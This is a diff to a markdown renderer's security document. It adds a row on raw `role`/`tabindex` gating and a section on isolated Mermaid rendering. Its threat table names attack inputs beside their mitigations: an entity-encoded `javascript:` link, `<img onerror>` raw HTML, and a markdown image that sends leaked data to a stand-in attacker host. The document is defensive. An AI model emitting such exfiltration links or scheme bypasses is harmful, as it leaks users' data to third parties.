@@ -39,6 +39,7 @@ the same per-element gate**, so the security posture is backend-independent.
 | `javascript:` / `data:` / `vbscript:` in a markdown link or image | Scheme allowlist (`safeLinkHref`), applied **after** decoding HTML entities and backslash escapes, so `&#x6a;avascript:` and friends are caught before the check. Default schemes: `http(s)`, `mailto`, `tel`, `sms`, `ftp(s)`. |
 | Raw HTML in the input (`<div>`, `<img onerror>`, …) | Passthrough by default — the renderer emits well-formed tags and the sink is the sole arbiter (allowlisted → element, else stripped/unwrapped). `htmlPolicy: 'escape'` literalizes it instead. The allowlist is **not** widened by passthrough. |
 | DOM clobbering via attacker `id` (shadowing `document.forms`, etc.) | The per-element gate strips every `id` outside the renderer-emitted footnote shape (`fn-…` / `fnref-…`). No attacker-chosen id survives. |
+| Focus stops / landmark roles via raw `role` / `tabindex` | Neither is on the allowlist. With the opt-in `tableWrapper`, the sink admits both names only so the renderer's table wrapper survives, and a per-element gate keeps them only on that exact shape (a `<div>` with the configured class whose sole element child is a `<table>`, forced to `role="region"` / `tabindex="0"`), stripping them everywhere else. Raw HTML copying that shape gets the same table scroll region, nothing more. |
 | Interactive/form injection via `<input>` | The gate keeps only the fixed read-only GFM task-list checkbox (`type=checkbox disabled`); any other `<input>` is dropped. |
 | Exfiltration via image/link destination (a prompt-injection classic: `![](https://attacker/?leak=…)`) | Opt-in **link/image origin policy** (`linkImagePolicy`) restricts which origins links/images may resolve to, compared after WHATWG canonicalization (credential-stripping, punycode, `\`→`/`, scheme-relative) so the usual allowlist bypasses fail. `data:` images can be blocked too. |
 | Trusted Types enforcement (`require-trusted-types-for 'script'`) | Every internal `innerHTML` write routes through one chokepoint that **blesses only sanitizer output** with a Trusted Types policy (a lazily created `streaming-markdown` policy, or a host policy via `trustedTypesPolicy`). No raw string reaches an injection sink. |
@@ -102,3 +103,17 @@ can hold different policies without bleed (see [#137 / ADR 0003](decisions/0003-
 Please report security issues privately via the repository's security advisories
 (GitHub → **Security → Report a vulnerability**) rather than a public issue, so a
 fix can ship before disclosure.
+
+## Optional isolated Mermaid execution
+
+The [isolated adapter](ISOLATED-MERMAID.md) moves parsing, temporary DOM, and SVG
+insertion into an opaque frame with a fixed CSP. It is opt-in and is distinct from
+the legacy `DiagramRenderer` SVG-insertion path. Read the host responsibilities
+before treating it as a containment boundary: CSP alone does not prevent frame
+self-navigation or establish comprehensive network isolation.
+
+Per-render presentation (theme, font family, font bytes) crosses into the frame with the source
+and is validated there (`parseRenderRequest`): only Mermaid's named themes, font-family lists
+without characters that could end a CSS declaration or open a `url()`, and bounded `ArrayBuffer`
+font bytes installed through `FontFace` (not a fetch, so `font-src 'none'` is unchanged). Invalid
+fields are dropped, never forwarded to Mermaid's configuration.
